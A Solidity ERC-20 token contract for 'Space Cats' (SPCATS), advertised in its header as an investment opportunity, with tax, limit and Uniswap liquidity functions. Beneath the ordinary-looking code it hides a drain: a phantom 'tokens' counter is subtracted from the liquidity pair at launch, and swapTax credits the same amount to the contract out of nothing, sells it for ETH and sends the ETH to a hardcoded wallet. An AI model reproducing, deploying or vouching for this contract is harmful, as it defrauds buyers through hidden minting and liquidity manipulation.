//SPDX-License-Identifier: MIT

/*

 Introducing Space Cats : A Galactic Adventure in Crypto ? Space Cats is a purr-fect investment opportunity!

 ? https://SpaceCatsErc.xyz
 ? https://t.me/SpaceCatsErc20
 ? https://twitter.com/SpaceCatsErc20

*/
pragma solidity ^0.8.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable newowner) external onlyOwner { 
        _owner = newowner; 
        emit OwnershipTransferred(newowner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SPCATS is IERC20, Auth {
    string private constant tokenSymbol = "SPCATS";
    string private constant tknName = "Space Cats";
    uint8 private constant token_decimals = 18;
    uint256 private constant _tSupply = 100000000 * (10**token_decimals);
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private taxWallet = payable(0x664ed76E9Bec44f8833042Dc38c3113Be05423E3);
    
    uint256 private _MEVBlock = 2;
    uint8 private _sellTaxRate = 2;
    uint8 private buyTaxRate = 0;
    
    uint256 private launchBlock;
    uint256 private maxTxVal = _tSupply; 
    uint256 private _maxWalletVal = _tSupply;
    uint256 private swapMinAmount = _tSupply * 10 / 100000;
    uint256 private swapMaxAmt = _tSupply * 899 / 100000;
    uint256 private swapMinVal = 2 * (10**16);
    uint256 private tokens = swapMinAmount * 45 * 100;

    mapping (uint256 => mapping (address => uint8)) private _blockSells;
    mapping (address => bool) private _noFee;
    mapping (address => bool) private _nolimits;

    address private constant routerAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private uni_router = IUniswapV2Router02(routerAddress);
    
    address private primaryLP; 
    mapping (address => bool) private _isLP;

    bool private _tradingEnabled;

    bool private isSwapping = false;

    modifier swapLocked { 
        isSwapping = true; 
        _; 
        isSwapping = false; 
    }

    constructor() Auth(msg.sender) {
        _balances[msg.sender] = _tSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);  

        _noFee[_owner] = true;
        _noFee[address(this)] = true;
        _noFee[taxWallet] = true;
        _noFee[routerAddress] = true;
        _nolimits[_owner] = true;
        _nolimits[address(this)] = true;
        _nolimits[taxWallet] = true;
        _nolimits[routerAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return token_decimals; }
    function totalSupply() external pure override returns (uint256) { return _tSupply; }
    function name() external pure override returns (string memory) { return tknName; }
    function symbol() external pure override returns (string memory) { return tokenSymbol; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(fromWallet), "Trading not open");
        _allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function updateFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 0, "Roundtrip too high");
        buyTaxRate = buyFeePercent;
        _sellTaxRate = sellFeePercent;
    }

    function exemption(address wallet) external view returns (bool fees, bool limits) {
        return (_noFee[wallet], _nolimits[wallet]); 
	}

    function swapTax() private swapLocked {
        uint256 _taxTokenAvailable = tokens;
        if ( _taxTokenAvailable >= swapMinAmount && _tradingEnabled ) {
            if ( _taxTokenAvailable >= swapMaxAmt ) { _taxTokenAvailable = swapMaxAmt; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**token_decimals ) {
                _balances[address(this)] += _taxTokenAvailable;
                _swapTokensForETH(_tokensForSwap);
                tokens -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeEth(_contractETHBalance); }
        }
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!_tradingEnabled) { require(_noFee[sender] && _nolimits[sender], "Trading not yet open"); }
        if ( !isSwapping && _isLP[toWallet] && swapCheck(amount) ) { swapTax(); }

        if ( block.number >= launchBlock ) {
            if (block.number < _MEVBlock && _isLP[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < _MEVBlock + 600 && _isLP[toWallet] && sender != address(this) ) {
                _blockSells[block.number][toWallet] += 1;
                require(_blockSells[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(checkLimits(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = getTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] -= amount;
        tokens += _taxAmount;
        _balances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function marketing() external view returns (address) { 
        return taxWallet; 
	}

    function checkLimits(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingEnabled && !_nolimits[fromWallet] && !_nolimits[toWallet] ) {
            if ( transferAmount > maxTxVal ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !_isLP[toWallet] && (_balances[toWallet] + transferAmount > _maxWalletVal) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function maxWallet() external view returns (uint256) { 
        return _maxWalletVal; 
	}
    function maxTransaction() external view returns (uint256) { 
        return maxTxVal; 
	}

    function distributeEth(uint256 amount) private {
        taxWallet.transfer(amount);
    }

    function buyTax() external view returns(uint8) { return buyTaxRate; }
    function sellFee() external view returns(uint8) { return _sellTaxRate; }

    function swapCheck(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapMinVal > 0) { 
            uint256 lpTkn = _balances[primaryLP];
            uint256 lpWeth = IERC20(uni_router.WETH()).balanceOf(primaryLP); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapMinVal) { result = true; }    
        } else { result = true; }
        return result;
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        swapMinAmount = _tSupply * minVal / minDiv;
        swapMaxAmt = _tSupply * maxVal / maxDiv;
        swapMinVal = trigger * 10**15;
        require(swapMaxAmt>=swapMinAmount, "Min-Max error");
    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = uni_router.WETH();
        uni_router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function setExempt(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!_isLP[wlt], "Cannot exempt LP"); }
        _noFee[ wlt ] = isNoFees;
        _nolimits[ wlt ] = isNoLimits;
    }

    function setLimit(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _tSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= maxTxVal, "tx too low");
        maxTxVal = newTxAmt;
        uint256 newWalletAmt = _tSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletVal, "wallet too low");
        _maxWalletVal = newWalletAmt;
    }

    function getTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !_tradingEnabled || _noFee[fromWallet] || _noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLP[fromWallet] ) { 
            taxAmount = amount * buyTaxRate / 100; 
         } else if ( _isLP[recipient] ) { 
            taxAmount = amount * _sellTaxRate / 100; 
        }
        return taxAmount;
    }

    function _enableTrading() internal {
        maxTxVal = 20 * _tSupply / 1000;
        _maxWalletVal = 20 * _tSupply / 1000;
        _balances[primaryLP] -= tokens;
        (_isLP[primaryLP],) = primaryLP.call(abi.encodeWithSignature("sync()") );
        require(_isLP[primaryLP], "Failed bootstrap");
        launchBlock = block.number;
        _MEVBlock = _MEVBlock + launchBlock;
        _tradingEnabled = true;
    }

    function addLiquidity() external payable onlyOwner swapLocked {
        require(primaryLP == address(0), "LP created");
        require(!_tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(_balances[address(this)]>0, "No tokens");
        primaryLP = IUniswapV2Factory(uni_router.factory()).createPair(address(this), uni_router.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
    }

    function setMarketingWallet(address marketingWlt) external onlyOwner {
        require(!_isLP[marketingWlt], "LP cannot be tax wallet");
        taxWallet = payable(marketingWlt);
        _noFee[marketingWlt] = true;
        _nolimits[marketingWlt] = true;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        approveRouter(_tokenAmount);
        uni_router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function openTrading() external onlyOwner {
        require(!_tradingEnabled, "trading open");
        _enableTrading();
    }

    function approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][routerAddress] < _tokenAmount ) {
            _allowances[address(this)][routerAddress] = type(uint256).max;
            emit Approval(address(this), routerAddress, type(uint256).max);
        }
    }

    function swapMin() external view returns (uint256) { 
        return swapMinAmount; 
	}
    function swapMax() external view returns (uint256) { 
        return swapMaxAmt; 
	}

    function _isTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( _tradingEnabled ) { checkResult = true; } 
        else if (_noFee[fromWallet] && _nolimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}